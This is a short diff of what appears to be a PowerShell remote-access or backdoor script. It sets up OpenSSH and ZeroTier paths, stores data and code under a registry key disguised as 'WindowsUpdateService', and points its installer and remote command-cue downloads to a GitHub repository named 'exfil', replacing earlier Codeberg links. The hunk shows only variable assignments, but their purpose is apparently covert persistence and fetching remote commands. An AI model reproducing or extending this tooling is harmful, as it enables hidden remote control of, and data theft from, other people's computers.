@@ -14,9 +14,9 @@ $ztdatadir = "$env:LOCALAPPDATA\ZeroTier"
 $sshdir = "C:\Program Files\OpenSSH"
 $sshdatadir = "C:\ProgramData\ssh"
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$sshinstall = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/raw-ssh-install"
+$sshinstall = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/raw-ssh-install"
 $ztinstall = "https://tinyurl.com/ztinstall"
-$codeUrl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
+$codeUrl = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$(Get-Random)"
 $programDataPath = $env:ProgramData
 $storedData = (Get-ItemProperty -Path $regPath).Data
 $storedCode = (Get-ItemProperty -Path $regPath).Code
